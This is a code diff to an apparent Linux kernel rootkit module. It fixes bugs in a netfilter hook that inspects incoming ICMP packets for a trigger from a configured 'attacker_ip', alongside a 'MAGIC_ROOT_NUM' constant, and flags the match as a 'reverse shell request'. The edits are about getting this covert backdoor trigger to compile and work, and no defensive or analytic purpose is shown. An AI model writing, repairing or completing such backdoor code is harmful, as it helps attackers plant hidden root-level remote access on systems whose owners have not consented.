@@ -72,7 +72,7 @@ typedef struct action_task {
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
 static _timer polling_timer;
-static struct nf_hook_ops icmp_hook = NULL;
+static struct nf_hook_ops icmp_hook;
 static __be32 attacker_ip = 0;
 
 // Module parameters
@@ -339,15 +339,15 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
                             const struct net_device* net_dev_in,
                             const struct net_device* net_dev_out,
                             int (*okfn)(struct sk_buff*)) {
-	struct iphdr ip_header;
+	struct iphdr* ip_header;
 
 	printk(KERN_EMERG "ICMP HOOK hit");
 
-	if (!skb) {
+	if (!socket_buff) {
 		goto accept;
 	}
 
-	ip_header = skb_header_pointer(socket_buff, 0, sizeof(ip_header), &ip_header);
+	ip_header = ip_hdr(socket_buff); 
 
 	if (!ip_header) {
 		goto accept;
@@ -358,7 +358,7 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 	if (ip_header->protocol == IPPROTO_ICMP) {
 		printk(KERN_INFO "ICMP from %pI4 to %pI4\n", &ip_header->saddr, &ip_header->daddr);
 
-		if (attacker_ip == &ip_header->saddr) {
+		if (attacker_ip == ip_header->saddr) {
 			printk(KERN_EMERG "Reverse shell request found!\n");
 		}
 	}
@@ -370,7 +370,7 @@ accept:
 static void icmp_hook_init(void) {
 	icmp_hook.hook = (void*) icmp_hook_func;
 	icmp_hook.pf = PF_INET; // Filter by IPV4 protocol family.
-	icmp_hook.hooknum = NF_IP_PRE_ROUTING;
+	icmp_hook.hooknum = NF_INET_PRE_ROUTING;
 	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function
 
 	if (nf_register_net_hook(&init_net, &icmp_hook)) {
